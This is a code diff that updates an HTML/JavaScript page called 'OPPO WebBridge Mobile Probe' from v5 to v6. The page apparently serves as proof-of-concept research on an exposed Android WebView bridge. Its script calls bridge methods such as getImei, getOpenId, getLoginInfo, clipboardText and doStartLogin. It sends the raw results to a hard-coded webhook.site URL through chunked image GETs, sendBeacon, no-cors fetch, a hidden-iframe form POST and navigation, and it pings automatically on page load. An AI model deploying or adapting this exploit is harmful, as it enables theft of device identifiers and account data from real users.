@@ -2,142 +2,119 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-  <title>OPPO WebBridge Mobile Probe v5</title>
+  <title>OPPO WebBridge Mobile Probe v6</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
   <style>
-    :root {
-      --bg: #050505;
-      --panel: #151515;
-      --panel2: #202020;
-      --text: #f2f2f2;
-      --muted: #b8b8b8;
-      --accent: #42d392;
-      --warn: #ff4f70;
-      --bad: #ff9f43;
-      --line: #3a3a3a;
-      --mono: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace;
-      --sans: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    }
     * { box-sizing: border-box; }
     body {
+      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
       margin: 0;
-      padding: 18px;
-      background: var(--bg);
-      color: var(--text);
-      font-family: var(--sans);
-      font-size: 18px;
+      padding: 24px 18px 90px;
+      background: #000;
+      color: #f5f5f5;
+      font-size: 22px;
       line-height: 1.45;
     }
-    h1 { font-size: 28px; margin: 0 0 8px 0; }
-    h2 { font-size: 22px; margin: 18px 0 8px; }
-    .warn { color: var(--warn); font-weight: 800; }
-    .ok { color: var(--accent); font-weight: 800; }
-    .bad { color: var(--bad); font-weight: 800; }
-    .muted { color: var(--muted); }
-    .top {
-      position: sticky;
-      top: 0;
-      z-index: 10;
-      background: linear-gradient(180deg, #050505 85%, rgba(5,5,5,0));
-      padding-bottom: 10px;
+    h1 { margin: 0 0 12px; font-size: 40px; line-height: 1.12; }
+    .warn { color: #ff4d73; font-weight: 900; font-size: 24px; margin: 14px 0 22px; }
+    .target {
+      background: #121212;
+      border: 1px solid #444;
+      border-radius: 18px;
+      padding: 14px;
+      margin: 14px 0;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 16px;
+      word-break: break-all;
+      color: #a6ffcb;
     }
-    .buttons { display: flex; gap: 10px; flex-wrap: wrap; margin: 12px 0; }
+    .btns { display: flex; flex-wrap: wrap; gap: 12px; margin: 18px 0; }
     button {
-      font-size: 17px;
-      font-weight: 700;
-      padding: 12px 14px;
-      border: 1px solid #555;
-      border-radius: 10px;
-      background: #f0f0f0;
+      border: 0;
+      border-radius: 16px;
+      padding: 18px 22px;
+      font-size: 22px;
+      font-weight: 900;
+      min-height: 64px;
+      background: #eee;
       color: #111;
-      min-height: 48px;
     }
-    button.primary { background: var(--accent); color:#07120b; border-color: var(--accent); }
-    button.danger { background: #ffdadf; color:#5b0010; border-color: #ff8da0; }
-    #status {
-      border: 1px solid var(--line);
-      background: var(--panel);
-      padding: 12px;
-      border-radius: 12px;
-      font-family: var(--mono);
+    button.primary { background: #43d08d; }
+    button.danger { background: #ff4d73; color: #000; }
+    button.wide { width: 100%; }
+    .status {
+      margin: 18px 0;
+      padding: 16px;
+      border: 1px solid #333;
+      border-radius: 18px;
+      background: #111;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      font-size: 20px;
       white-space: pre-wrap;
       word-break: break-word;
-      font-size: 16px;
     }
-    .grid { display: grid; grid-template-columns: 1fr; gap: 12px; }
     .card {
-      background: var(--panel);
-      border: 1px solid var(--line);
-      border-radius: 14px;
-      padding: 14px;
-      overflow-wrap: anywhere;
+      margin: 14px 0;
+      padding: 16px;
+      border-radius: 18px;
+      background: #151515;
+      border: 1px solid #333;
     }
-    .card.good { border-color: #2ecc71; }
-    .card.empty { border-color: #555; opacity: 0.92; }
-    .card.fail { border-color: #ff9f43; }
-    .kv { font-family: var(--mono); font-size: 16px; margin: 4px 0; white-space: pre-wrap; word-break: break-word; }
-    .bigResult {
-      font-family: var(--mono);
+    .card h2 { margin: 0 0 10px; font-size: 26px; }
+    .ok { color: #5cff9f; font-weight: 900; }
+    .bad { color: #ff667f; font-weight: 900; }
+    .muted { color: #aaa; }
+    .kv {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
       font-size: 18px;
-      color: #fff;
-      background: var(--panel2);
-      border-radius: 8px;
-      padding: 10px;
       white-space: pre-wrap;
       word-break: break-word;
     }
     pre {
-      background: #f2f2f2;
+      display: none;
+      background: #f3f3f3;
       color: #111;
-      padding: 12px;
-      border-radius: 12px;
+      padding: 16px;
       white-space: pre-wrap;
       word-break: break-word;
-      font-size: 14px;
-      line-height: 1.25;
-      max-height: 60vh;
-      overflow: auto;
+      font-size: 16px;
+      border-radius: 12px;
     }
-    details { margin: 12px 0; }
-    summary { cursor:pointer; font-weight: 800; }
-    .small { font-size: 14px; }
+    iframe { width: 1px; height: 1px; border: 0; opacity: 0; position: absolute; left: -9999px; }
   </style>
 </head>
 <body>
-<div class="top">
-  <h1>OPPO WebBridge Mobile Probe v5</h1>
-  <div class="warn">RAW mode for researcher-owned test device. This page prioritizes large readable phone output and short webhook pings/chunks.</div>
-  <div class="buttons">
-    <button class="primary" onclick="pingWebhook('manual_ping')">Ping webhook</button>
-    <button onclick="runFullRawProbe('manual_raw_button')">RAW sensitive probe</button>
-    <button class="primary" onclick="tryDispatcherReadonly('manual_dispatcher_readonly_button')">Dispatcher readonly APIs</button>
-    <button onclick="tryIndirectNativeApi('manual_indirect_native_api_button')">Indirect native API</button>
-    <button onclick="tryClipboardMarker('manual_clipboard_button')">Clipboard marker</button>
-    <button onclick="tryStartLogin('manual_start_login_button')">doStartLogin</button>
-    <button onclick="toggleJson()">Toggle full JSON</button>
-  </div>
-  <div id="status">WAITING</div>
+<h1>OPPO WebBridge Mobile Probe v6</h1>
+<p class="warn">v6 adds a top-level navigation ping and HTML form POST fallback. Use it to prove whether webhook.site is reachable from this WebView.</p>
+
+<div class="target" id="target"></div>
+
+<div class="btns">
+  <button class="primary" onclick="pingWebhook('manual_ping_button')">Ping webhook</button>
+  <button class="danger" onclick="navigateWebhookPing()">NAVIGATE webhook ping</button>
+  <button class="primary wide" onclick="tryDispatcherReadonly()">Dispatcher readonly APIs</button>
+  <button onclick="runRawProbe()">RAW sensitive probe</button>
+  <button onclick="tryIndirectNativeApi()">Indirect native API</button>
+  <button onclick="tryClipboardMarker()">Clipboard marker</button>
+  <button onclick="tryStartLogin()">doStartLogin</button>
+  <button onclick="toggleJson()">Toggle full JSON</button>
 </div>
 
-<h2>Readable results</h2>
-<div id="cards" class="grid"></div>
+<div id="status" class="status">WAITING</div>
+<div id="cards"></div>
+<pre id="out"></pre>
 
-<details id="jsonDetails">
-  <summary>Full JSON</summary>
-  <pre id="out"></pre>
-</details>
+<iframe name="webhook_sink" id="webhook_sink"></iframe>
 
 <script>
 (function () {
   const WEBHOOK = "https://webhook.site/0d6bb58d-a021-4aa2-b4d6-2d2ebb72fcdd";
-  const RAW_TO_WEBHOOK = true;
+  const VERSION = "mobile_probe_v6_form_nav";
+  window.__OPPO_WEBHOOK = WEBHOOK;
+  window.__OPPO_VERSION = VERSION;
+  window.__LAST_PAYLOAD = null;
 
-  const RAW_METHODS = [
-    "getImei", "getOpenId", "getLoginInfo", "isLogin", "getChannelId",
-    "getPackageName", "getDeviceModel", "getNetworkType", "getRomVersion",
-    "getRomVersionCode", "getStatusBarHeight", "isInstalled", "isSupportShake",
-    "getProgress", "getButtonStatus"
-  ];
+  document.getElementById("target").textContent = "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION;
 
   const READONLY_ACTIONS = [
     "account_islogin",
@@ -151,7 +128,23 @@
     "get_network_type"
   ];
 
-  function $(id) { return document.getElementById(id); }
+  const RAW_METHODS = [
+    "getImei",
+    "getOpenId",
+    "getLoginInfo",
+    "isLogin",
+    "getChannelId",
+    "getPackageName",
+    "getDeviceModel",
+    "getNetworkType",
+    "getRomVersion",
+    "getRomVersionCode",
+    "getStatusBarHeight",
+    "isInstalled",
+    "isSupportShake",
+    "getProgress",
+    "getButtonStatus"
+  ];
 
   function safeString(x) {
     try {
@@ -165,14 +158,15 @@
     }
   }
 
-  function isEmptyValue(raw) {
-    return raw.length === 0 || raw === "undefined" || raw === "null" || raw === "\"\"";
+  function short(s, n) {
+    s = safeString(s);
+    if (s.length <= n) return s;
+    return s.slice(0, n) + "...[+" + (s.length - n) + " chars]";
   }
 
   function describeAndroidObject() {
     const a = window.android;
     if (!a || typeof a !== "object") return { exists: false, type: typeof a };
-
     let ownKeys = [];
     let functionKeys = [];
     try {
@@ -181,7 +175,6 @@
         try { return typeof a[k] === "function"; } catch (e) { return false; }
       });
     } catch (e) {}
-
     return {
       exists: true,
       type: typeof a,
@@ -203,7 +196,6 @@
       empty: null,
       error: null
     };
-
     try {
       if (!a || typeof a !== "object") {
         item.error = "window.android missing";
@@ -219,7 +211,7 @@
       item.ok = true;
       item.returnType = typeof ret;
       item.rawReturnValue = raw;
-      item.empty = isEmptyValue(raw);
+      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
       return item;
     } catch (e) {
       item.error = String(e && (e.stack || e.message || e));
@@ -227,7 +219,7 @@
     }
   }
 
-  function callBridgeRaw(method, arg) {
+  function callBridgeOneArg(method, arg) {
     const item = {
       bridgeMethod: method,
       arg,
@@ -254,7 +246,7 @@
       item.ok = true;
       item.returnType = typeof ret;
       item.rawReturnValue = raw;
-      item.empty = isEmptyValue(raw);
+      item.empty = raw === "" || raw === "undefined" || raw === "null";
       return item;
     } catch (e) {
       item.error = String(e && (e.stack || e.message || e));
@@ -265,12 +257,12 @@
   function basePayload(eventType, reason) {
     return {
       eventType,
-      version: "mobile_readable_v5",
+      version: VERSION,
       ts: new Date().toISOString(),
       reason,
       safetyBoundary: {
         rawSensitiveValuesDisplayedOnDevice: true,
-        rawSensitiveValuesSentToWebhook: RAW_TO_WEBHOOK,
+        rawSensitiveValuesSentToWebhook: true,
         testingDevice: "researcher_owned_device"
       },
       location: {
@@ -290,67 +282,72 @@
     };
   }
 
-  function short(v, n) {
-    const s = safeString(v);
-    return s.length > n ? s.slice(0, n) + "...[truncated]" : s;
+  function queryFromPayload(payload, maxLen) {
+    const json = JSON.stringify(payload);
+    return "event=" + encodeURIComponent(payload.eventType) +
+      "&version=" + encodeURIComponent(VERSION) +
+      "&t=" + encodeURIComponent(Date.now()) +
+      "&bridge=" + encodeURIComponent(!!window.android) +
+      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 160)) +
+      "&d=" + encodeURIComponent(json.slice(0, maxLen || 2200));
   }
 
-  function imgGet(path, params) {
+  function sendFormPost(path, payload) {
     try {
-      const qs = Object.entries(params).map(([k, v]) => encodeURIComponent(k) + "=" + encodeURIComponent(safeString(v))).join("&");
-      const img = new Image();
-      img.referrerPolicy = "no-referrer";
-      img.src = WEBHOOK + path + "?" + qs;
-      return true;
-    } catch (e) { return false; }
-  }
-
-  function formPost(path, fields) {
-    try {
-      let iframe = document.getElementById("hiddenWebhookFrame");
-      if (!iframe) {
-        iframe = document.createElement("iframe");
-        iframe.name = "hiddenWebhookFrame";
-        iframe.id = "hiddenWebhookFrame";
-        iframe.style.display = "none";
-        document.body.appendChild(iframe);
-      }
       const form = document.createElement("form");
       form.method = "POST";
-      form.action = WEBHOOK + path;
-      form.target = "hiddenWebhookFrame";
+      form.action = WEBHOOK + path + "?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now();
+      form.target = "webhook_sink";
       form.enctype = "text/plain";
-      Object.entries(fields).forEach(([k, v]) => {
-        const input = document.createElement("input");
-        input.type = "hidden";
-        input.name = k;
-        input.value = safeString(v);
-        form.appendChild(input);
-      });
+
+      const input = document.createElement("textarea");
+      input.name = "payload";
+      input.value = JSON.stringify(payload);
+      form.appendChild(input);
+
       document.body.appendChild(form);
       form.submit();
-      setTimeout(() => { try { form.remove(); } catch(e){} }, 1000);
-      return true;
-    } catch (e) { return false; }
+      setTimeout(function(){ try { form.remove(); } catch(e){} }, 2000);
+    } catch (e) {}
   }
 
   function sendWebhook(payload) {
     const json = JSON.stringify(payload);
-    const event = payload.eventType || "UNKNOWN";
+    const eventPath = "/v6-" + String(payload.eventType || "event").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
 
-    // Always send tiny pings first. These should be visible even if the large body is dropped.
-    imgGet("/v5-ping", { event, t: Date.now(), bridge: !!window.android, ua: navigator.userAgent.slice(0, 120) });
-    imgGet("/v5-summary", { event, t: Date.now(), reason: payload.reason, href: location.href.slice(0, 180), jsonLen: json.length });
+    // 1. Extremely short GET ping.
+    try {
+      new Image().src = WEBHOOK + "/v6-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android);
+    } catch (e) {}
 
+    // 2. Short summary GET.
+    try {
+      new Image().src = WEBHOOK + "/v6-summary?" + queryFromPayload(payload, 1500);
+    } catch (e) {}
+
+    // 3. Chunked GET.
+    try {
+      const enc = encodeURIComponent(json);
+      const size = 1500;
+      const total = Math.ceil(enc.length / size);
+      for (let i = 0; i < Math.min(total, 12); i++) {
+        const part = enc.slice(i * size, (i + 1) * size);
+        const img = new Image();
+        img.src = WEBHOOK + "/v6-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + part;
+      }
+    } catch (e) {}
+
+    // 4. Beacon with text/plain.
     try {
       navigator.sendBeacon(
-        WEBHOOK + "/v5-beacon",
+        WEBHOOK + eventPath + "-beacon",
         new Blob([json], { type: "text/plain" })
       );
     } catch (e) {}
 
+    // 5. Fetch no-cors text/plain.
     try {
-      fetch(WEBHOOK + "/v5-fetch-post", {
+      fetch(WEBHOOK + eventPath + "-fetch", {
         method: "POST",
         mode: "no-cors",
         headers: { "content-type": "text/plain" },
@@ -358,112 +355,134 @@
       }).catch(function(){});
     } catch (e) {}
 
-    formPost("/v5-form-post", { event, t: Date.now(), payload: json.slice(0, 60000) });
-
-    // Chunk the raw payload into short GETs. This is the most visible fallback in restrictive WebViews.
-    const chunkSize = 1400;
-    const maxChunks = Math.min(30, Math.ceil(json.length / chunkSize));
-    for (let i = 0; i < maxChunks; i++) {
-      imgGet("/v5-chunk", {
-        event,
-        t: Date.now(),
-        i,
-        n: maxChunks,
-        d: json.slice(i * chunkSize, (i + 1) * chunkSize)
-      });
-    }
-  }
-
-  function resultToCard(r, idx) {
-    const method = r.method || r.bridgeMethod || ("result_" + idx);
-    const arg = r.arg !== undefined ? r.arg : (r.args ? JSON.stringify(r.args) : "");
-    const raw = r.rawReturnValue === null || r.rawReturnValue === undefined ? "" : String(r.rawReturnValue);
-    const cls = r.ok ? (r.empty ? "empty" : "good") : "fail";
-    const verdict = r.ok ? (r.empty ? "OK_EMPTY" : "OK_NON_EMPTY") : "FAIL";
-    return `<div class="card ${cls}">
-      <div class="kv"><b>#${idx + 1} ${escapeHtml(method)}</b> <span class="${r.ok ? (r.empty ? 'bad' : 'ok') : 'bad'}">${verdict}</span></div>
-      <div class="kv">returnType: ${escapeHtml(r.returnType)}</div>
-      ${arg ? `<div class="kv">arg: ${escapeHtml(short(arg, 700))}</div>` : ""}
-      ${r.error ? `<div class="kv bad">error: ${escapeHtml(short(r.error, 900))}</div>` : ""}
-      <div class="bigResult">${escapeHtml(short(raw, 1600))}</div>
-    </div>`;
-  }
-
-  function escapeHtml(s) {
-    return String(s === null || s === undefined ? "" : s)
-      .replace(/&/g, "&amp;")
-      .replace(/</g, "&lt;")
-      .replace(/>/g, "&gt;")
-      .replace(/\"/g, "&quot;")
-      .replace(/'/g, "&#039;");
+    // 6. Classic HTML form POST to hidden iframe.
+    sendFormPost(eventPath + "-form", payload);
   }
 
   function renderCards(payload) {
-    const cards = [];
-    cards.push(`<div class="card">
-      <div class="kv"><b>${escapeHtml(payload.eventType)}</b></div>
-      <div class="kv">ts: ${escapeHtml(payload.ts)}</div>
-      <div class="kv">reason: ${escapeHtml(payload.reason)}</div>
-      <div class="kv">androidBridge.exists: <span class="${payload.androidBridge && payload.androidBridge.exists ? 'ok' : 'bad'}">${payload.androidBridge && payload.androidBridge.exists}</span></div>
-      <div class="kv">UA: ${escapeHtml(short(navigator.userAgent, 240))}</div>
-    </div>`);
+    const root = document.getElementById("cards");
+    root.innerHTML = "";
 
-    const results = payload.results || (payload.result ? [payload.result] : []);
-    const nonEmpty = results.filter(r => r && r.ok && r.empty === false);
-    if (nonEmpty.length) {
-      cards.push(`<div class="card good"><b>NON-EMPTY RESULTS: ${nonEmpty.length}</b><br>${escapeHtml(nonEmpty.map(r => r.method || r.bridgeMethod).join(', '))}</div>`);
-    } else if (results.length) {
-      cards.push(`<div class="card empty"><b>No non-empty result in this run.</b></div>`);
+    const top = document.createElement("div");
+    top.className = "card";
+    top.innerHTML =
+      "<h2>" + payload.eventType + "</h2>" +
+      "<div class='kv'>time=" + payload.ts + "\nbridge=" + (!!window.android) + "\nwebhook target=" + WEBHOOK + "\nWebhook pings/chunks/form attempted.</div>";
+    root.appendChild(top);
+
+    const items = payload.results || [];
+    const hot = items.filter(x => {
+      const s = safeString(x.rawReturnValue);
+      return x.ok && !(x.empty) && s !== "" && s !== "undefined" && s !== "null";
+    });
+
+    const hotCard = document.createElement("div");
+    hotCard.className = "card";
+    if (hot.length) {
+      hotCard.innerHTML = "<h2 class='ok'>OK_NON_EMPTY count=" + hot.length + "</h2>";
+      hot.forEach(x => {
+        const div = document.createElement("div");
+        div.className = "kv";
+        div.style.marginTop = "12px";
+        div.textContent =
+          "method=" + (x.method || x.bridgeMethod) + "\n" +
+          "arg=" + short(x.arg || x.args || "", 500) + "\n" +
+          "returnType=" + x.returnType + "\n" +
+          "rawReturnValue=" + short(x.rawReturnValue, 1200);
+        hotCard.appendChild(div);
+      });
+    } else {
+      hotCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_SENSITIVE_RETURN_YET</h2><div class='kv'>All tested sensitive/account actions are empty, undefined, null, missing, or failed so far.</div>";
     }
-    results.forEach((r, i) => cards.push(resultToCard(r, i)));
-    $("cards").innerHTML = cards.join("\n");
+    root.appendChild(hotCard);
+
+    items.slice(0, 80).forEach(x => {
+      const card = document.createElement("div");
+      card.className = "card";
+      const okClass = x.ok ? (x.empty ? "muted" : "ok") : "bad";
+      card.innerHTML =
+        "<h2 class='" + okClass + "'>" + (x.method || x.bridgeMethod) + "</h2>" +
+        "<div class='kv'>" +
+        "ok=" + x.ok + "\n" +
+        "exists=" + x.exists + "\n" +
+        "empty=" + x.empty + "\n" +
+        "returnType=" + x.returnType + "\n" +
+        "arg=" + short(x.arg || x.args || "", 500) + "\n" +
+        "rawReturnValue=" + short(x.rawReturnValue, 1000) + "\n" +
+        "error=" + short(x.error, 800) +
+        "</div>";
+      root.appendChild(card);
+    });
   }
 
   function renderAndSend(payload) {
-    $("status").textContent = payload.eventType + "\n" + payload.ts + "\nbridge=" + (payload.androidBridge && payload.androidBridge.exists) + "\nWebhook pings/chunks attempted.";
-    $("out").textContent = JSON.stringify(payload, null, 2);
+    window.__LAST_PAYLOAD = payload;
+    document.getElementById("status").textContent =
+      payload.eventType + "\n" +
+      payload.ts + "\n" +
+      "bridge=" + (!!window.android) + "\n" +
+      "Webhook target=" + WEBHOOK + "\n" +
+      "Webhook pings/chunks/form attempted.";
+    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
     renderCards(payload);
     sendWebhook(payload);
   }
 
   window.toggleJson = function() {
-    const d = $("jsonDetails");
-    d.open = !d.open;
+    const p = document.getElementById("out");
+    p.style.display = p.style.display === "block" ? "none" : "block";
   };
 
   window.pingWebhook = function(reason) {
-    const payload = basePayload("OPPO_V5_WEBHOOK_PING", reason);
-    payload.note = "If webhook.site receives /v5-ping or /v5-summary, transport works.";
+    const payload = basePayload("OPPO_V6_WEBHOOK_PING", reason || "manual_ping");
+    payload.note = "If this does not appear in webhook.site, the issue is endpoint/network/WebView outbound delivery, not bridge logic.";
     renderAndSend(payload);
   };
 
-  window.runFullRawProbe = function(reason) {
-    const payload = basePayload("OPPO_SENSITIVE_RAW_RESULT", reason);
+  window.navigateWebhookPing = function() {
+    const url = WEBHOOK +
+      "/v6-nav-ping?event=OPPO_V6_NAV_PING&t=" + Date.now() +
+      "&bridge=" + encodeURIComponent(!!window.android) +
+      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
+      "&from=" + encodeURIComponent(location.href.slice(0, 220));
+    location.href = url;
+  };
+
+  window.runRawProbe = function() {
+    const payload = basePayload("OPPO_V6_RAW_RESULT", "manual_raw_probe");
     payload.results = RAW_METHODS.map(m => callBridge(m, []));
     renderAndSend(payload);
   };
 
-  window.tryStartLogin = function(reason) {
-    const payload = basePayload("OPPO_START_LOGIN_RESULT", reason);
-    payload.result = callBridge("doStartLogin", []);
-    payload.note = "State-changing / login UI validation. Use only on researcher-owned device.";
+  window.tryDispatcherReadonly = function () {
+    const candidates = [];
+    for (const a of READONLY_ACTIONS) {
+      candidates.push({ type: a });
+      candidates.push({ action: a });
+      candidates.push({ method: a });
+      candidates.push({ name: a });
+      candidates.push({ id: a });
+      candidates.push({ type: a, data: {} });
+      candidates.push({ id: "oppo_audit_" + a, type: a, data: {} });
+      candidates.push({ id: "oppo_audit_" + a, type: a, params: {} });
+      candidates.push({ action: a, data: {} });
+      candidates.push({ action: a, params: {} });
+      candidates.push({ method: a, data: {} });
+      candidates.push({ method: a, params: {} });
+    }
+    const results = [];
+    for (const c of candidates) {
+      const arg = JSON.stringify(c);
+      results.push(callBridgeOneArg("callNativeApi", arg));
+      results.push(callBridgeOneArg("callAsyncNativeApi", arg));
+    }
+    const payload = basePayload("OPPO_V6_DISPATCHER_READONLY_RESULT", "manual_dispatcher_readonly");
+    payload.actions = READONLY_ACTIONS;
+    payload.results = results;
     renderAndSend(payload);
   };
 
-  window.tryClipboardMarker = function(reason) {
-    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
-    const payload = basePayload("OPPO_CLIPBOARD_MARKER_RESULT", reason);
-    payload.marker = marker;
-    payload.results = [
-      callBridge("clipboardText", []),
-      callBridge("clipboardText", [marker]),
-      callBridge("clipboardText", [JSON.stringify({ text: marker })])
-    ];
-    renderAndSend(payload);
-  };
-
-  window.tryIndirectNativeApi = function(reason) {
-    const payload = basePayload("OPPO_INDIRECT_NATIVE_API_RESULT", reason);
+  window.tryIndirectNativeApi = function() {
     const candidates = [
       ["callNativeApi", ["getImei"]],
       ["callNativeApi", ["getOpenId"]],
@@ -481,37 +500,33 @@
       ["callAsyncNativeApi", [JSON.stringify({ method: "getOpenId" })]],
       ["callAsyncNativeApi", [JSON.stringify({ method: "getLoginInfo" })]]
     ];
+    const payload = basePayload("OPPO_V6_INDIRECT_NATIVE_API_RESULT", "manual_indirect_native_api");
     payload.results = candidates.map(c => callBridge(c[0], c[1]));
     renderAndSend(payload);
   };
 
-  window.tryDispatcherReadonly = function(reason) {
-    const payload = basePayload("OPPO_DISPATCHER_READONLY_RESULT", reason);
-    const candidates = [];
-    for (const a of READONLY_ACTIONS) {
-      candidates.push({ type: a });
-      candidates.push({ action: a });
-      candidates.push({ method: a });
-      candidates.push({ name: a });
-      candidates.push({ id: a });
-      candidates.push({ type: a, data: {} });
-      candidates.push({ action: a, data: {} });
-      candidates.push({ id: "oppo_audit_" + a, type: a, data: {} });
-      candidates.push({ id: "oppo_audit_" + a, type: a, params: {} });
-    }
-    const results = [];
-    for (const c of candidates) {
-      const arg = JSON.stringify(c);
-      results.push(callBridgeRaw("callNativeApi", arg));
-      results.push(callBridgeRaw("callAsyncNativeApi", arg));
-    }
-    payload.results = results;
+  window.tryClipboardMarker = function() {
+    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
+    const payload = basePayload("OPPO_V6_CLIPBOARD_MARKER_RESULT", "manual_clipboard_marker");
+    payload.marker = marker;
+    payload.results = [
+      callBridge("clipboardText", []),
+      callBridge("clipboardText", [marker]),
+      callBridge("clipboardText", [JSON.stringify({ text: marker })])
+    ];
+    renderAndSend(payload);
+  };
+
+  window.tryStartLogin = function() {
+    const payload = basePayload("OPPO_V6_START_LOGIN_RESULT", "manual_start_login");
+    payload.results = [callBridge("doStartLogin", [])];
+    payload.note = "State-changing UI test. Use only if you intentionally want to test login UI opening.";
     renderAndSend(payload);
   };
 
   setTimeout(function () {
-    pingWebhook("auto_ping_after_load_600ms");
-  }, 600);
+    pingWebhook("auto_after_load_1200ms");
+  }, 1200);
 })();
 </script>
 </body>
